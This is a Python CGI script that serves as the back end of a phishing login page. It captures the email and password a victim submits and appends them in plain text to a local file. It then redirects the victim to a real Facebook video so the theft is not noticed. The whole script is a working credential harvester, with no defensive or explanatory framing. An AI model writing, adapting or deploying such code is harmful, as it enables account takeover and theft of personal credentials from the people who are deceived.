#!/usr/local/bin/python3
import cgi, cgitb

cgitb.enable()
print("Content-type: text/html\n")

form = cgi.FieldStorage()

# Retrieve the values entered by the user in the form fields
email = form.getvalue('email')
password = form.getvalue('pass')

# Store the login information in a text file
with open('login_info.txt', 'a') as file:
    file.write(f"Email: {email}\nPassword: {password}\n\n")

# HTML template to display the automatic redirection to FB
html_template = """
<!DOCTYPE html>
<html>
<body>
    <script>
        // Perform automatic redirection to Facebook after 0.5 seconds (500 milliseconds)
        setTimeout(function() {
            window.location.href = "https://www.facebook.com/watch?v=1325542551505173";
        }, 500);
    </script>
</body>
</html>
"""

print(html_template)

